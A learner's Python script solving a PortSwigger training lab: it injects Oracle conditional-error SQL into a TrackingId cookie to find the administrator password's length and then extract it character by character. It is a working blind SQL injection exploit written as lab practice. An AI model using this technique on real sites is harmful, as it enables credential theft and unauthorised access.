# Lab: Blind SQL injection with conditional responses
# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
# Start date: 2.20.2021
# Date lab was completed: 2.20.2021
# Todo: Cook the code so other ppl can understand it cuz right now it's messy you runny egg
import requests

# https://stackoverflow.com/questions/17182656/how-do-i-iterate-through-the-alphabet
# Making the assumption that the password is all lowercase letters... but this is where I am unsure
from string import ascii_lowercase, digits

# https://stackoverflow.com/questions/17182656/how-do-i-iterate-through-the-alphabet
# Making the assumption that the password is all lowercase letters... but this is where I am unsure
from string import ascii_lowercase, digits

print("Starting the script! Yeehaw!")
link = "https://ac221f071eeb8b5580c86ae2008100cf.web-security-academy.net/"
response = requests.get(link)

# print(response.cookies["TrackingId"])

trackingCookie = response.cookies["TrackingId"]
condition = "LENGTH((SELECT password FROM users WHERE username = 'administrator')) = " 
evilQuery = "' UNION SELECT CASE WHEN () THEN to_char(1/0) ELSE NULL END FROM dual--"

firstHalfOfEvil = "' UNION SELECT CASE WHEN ("
secondHalfOfEvil = ") THEN to_char(1/0) ELSE NULL END FROM dual--"
entireEvilQuery = firstHalfOfEvil + condition + secondHalfOfEvil
evilCookie = trackingCookie + entireEvilQuery
cookies = {"TrackingId": evilCookie}
# print("le evil cookie: " + evilCookie)
# print("Iterating! Making le request")
# response = requests.get(link, cookies = cookies)
# print(response.status_code)
# print(response.text)

lowerRange = 2
upperRange = 30

for potenLen in range(lowerRange, upperRange + 1):
    firstHalfOfEvil = "' UNION SELECT CASE WHEN ("
    secondHalfOfEvil = ") THEN to_char(1/0) ELSE NULL END FROM dual--"
    condition = "LENGTH((SELECT password FROM users WHERE username = 'administrator')) = " + str(potenLen)
    entireEvilQuery = firstHalfOfEvil + condition + secondHalfOfEvil
    evilCookie = trackingCookie + entireEvilQuery
    print(evilCookie)
    cookies = {"TrackingId": evilCookie}
    # print("le evil cookie: " + evilCookie)
    # print("Iterating! Making le request")
    response = requests.get(link, cookies = cookies)

    if "Internal Server Error" in response.text:
        print("Password length found! It's " + str(potenLen) + " chars long!")
        print("Breaking!")
        break
    else:
        print("This one ain't it, Len %d" % (potenLen))

condition1 = "SUBSTRING((SELECT password FROM users WHERE username = 'administrator')"
pwStr = ""

# change the first char and last char of this string 
condition2 = ", 1) = '"

alphaChars = ascii_lowercase + digits
for x in range(1, 21):
    print("Iterating...")
    for c in alphaChars:
        firstHalfOfEvil = "' UNION SELECT CASE WHEN ("
        condition1 = "1=1 AND SUBSTR((SELECT password FROM users WHERE username = 'administrator')," + str(x)
        condition2 = ", 1) = " + "'" + c + "'"
        secondHalfOfEvil = ") THEN to_char(1/0) ELSE NULL END FROM dual--"
        findPwQuery = firstHalfOfEvil + condition1 + condition2 + secondHalfOfEvil
        evilCookie = trackingCookie + findPwQuery
        print(evilCookie)
        cookies = {"TrackingId": evilCookie}
        response = requests.get(link, cookies = cookies)

        if "Internal Server Error" in response.text:
            pwStr += c
            print("Char no %d found, it's %s" % (x, c))
            break
        else:
            print('EvilCookie %s' % evilCookie)
            print("This one ain't it. Iteration char %s" % (c))

print("Your final pw is %s" % pwStr)



